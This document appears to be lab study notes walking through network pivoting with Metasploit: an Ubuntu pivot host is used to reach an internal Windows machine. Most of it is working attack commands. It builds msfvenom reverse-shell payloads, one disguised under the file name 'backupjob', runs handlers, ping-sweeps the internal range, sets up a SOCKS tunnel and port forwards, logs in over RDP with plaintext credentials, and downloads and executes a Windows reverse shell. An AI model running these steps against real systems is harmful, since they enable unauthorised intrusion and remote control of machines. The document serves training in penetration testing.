# 🧠 SCENARIO

- Attack Host → your machine
    
- Ubuntu → pivot (10.129.x.x / 172.16.5.129)
    
- Windows → internal target (172.16.5.19)
    

Goal:  
👉 Pivot via Ubuntu → access Windows (RDP / shell)

---

# 🔴 PART 1 — Get Meterpreter on Ubuntu (Pivot)

---

## ✅ Step 1: Create payload

**Where:** Attack Host

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=8080 -f elf -o backupjob
```

**Why:**

- Create reverse shell payload
    
- It will connect back to your machine
    

---

## ✅ Step 2: Start handler

**Where:** Attack Host

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

**Why:**

- Wait for incoming reverse connection
    
- `0.0.0.0` = listen on all interfaces
    

---

## ✅ Step 3: Transfer payload

**Where:** Attack Host

```bash
scp backupjob ubuntu@<UBUNTU_IP>:~/
```

**Why:**

- Move payload to pivot host
    

---

## ✅ Step 4: Execute payload

**Where:** Ubuntu (SSH login)

```bash
chmod +x backupjob
./backupjob
```

**Why:**

- Run payload → connect back → open Meterpreter
    

---

## ✅ Result:

👉 You get Meterpreter session on Attack Host

# 🔴 PART 2 — Discover Internal Network

---

## ✅ Step 5: Ping sweep

**Where:** Meterpreter session

```bash
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

**Why:**

- Find live hosts in internal network

#### Ping Sweep For Loop on Linux Pivot Hosts

        shellsession
`for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`

#### Ping Sweep For Loop Using CMD

        cmd-session
`for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`

#### Ping Sweep Using PowerShell

        powershell-session
`1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}`

# 🔴 PART 3 — Setup Pivot (SOCKS via Meterpreter)

---

## ✅ Step 6: Start SOCKS proxy

**Where:** Attack Host (msfconsole)

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

**Why:**

- Create proxy tunnel via Meterpreter
    

---

## ✅ Step 7: Add route

**Where:** Attack Host (msfconsole)

```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

OR:

```bash
meterpreter > run autoroute -s 172.16.5.0/23
```

**Why:**

- Tell Metasploit:  
    👉 "Use this session to reach internal network"
    
After adding the necessary route(s) we can use the `-p` option to list the active routes to make sure our configuration is applied as expected.
```
meterpreter > run autoroute -p
```
---

## ✅ Step 8: Configure proxychains

**Where:** Attack Host

Edit:

```bash
nano /etc/proxychains.conf
```

Add:

```bash
socks4 127.0.0.1 9050
```

**Why:**

- Route tools through SOCKS tunnel

# 🔴 PART 5 — Access Windows via RDP

---

## ✅ Method 1: Direct via proxychains

**Where:** Attack Host

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Why:**

- Connect RDP through pivot tunnel
    

---

## ✅ Method 2: Using portfwd (cleaner)

---

### Step 10: Forward RDP

**Where:** Meterpreter

```bash
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

**Why:**

- Map remote RDP → local port
    
The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session.

---

### Step 11: Connect locally

**Where:** Attack Host

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

**Why:**

- Access Windows via local tunnel

# 🔴 PART 6 — Get Reverse Shell from Windows (Advanced)## Meterpreter Reverse Port Forwarding

---

## ✅ Step 12: Create Windows payload

**Where:** Attack Host

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o shell.exe
```

**Why:**

- Windows will connect to Ubuntu (pivot)
    

---

## ✅ Step 13: Setup handler

**Where:** Attack Host

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8081
run
```

---

## ✅ Step 14: Setup reverse port forward

**Where:** Meterpreter

```bash
portfwd add -R -l 8081 -p 1234 -L <YOUR_IP>
```

**Why:**  
Flow:

```bash
Windows → Ubuntu:1234 → AttackHost:8081
```

---

## ✅ Step 15: Transfer payload

**Where:** Attack Host → Ubuntu

```bash
scp shell.exe ubuntu@<UBUNTU_IP>:~/
```

---

## ✅ Step 16: Host file

**Where:** Ubuntu

```bash
python3 -m http.server 8123
```

---

## ✅ Step 17: Download on Windows

**Where:** Windows

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/shell.exe" -OutFile "C:\shell.exe"
```

---

## ✅ Step 18: Execute

**Where:** Windows

```powershell
C:\shell.exe
```
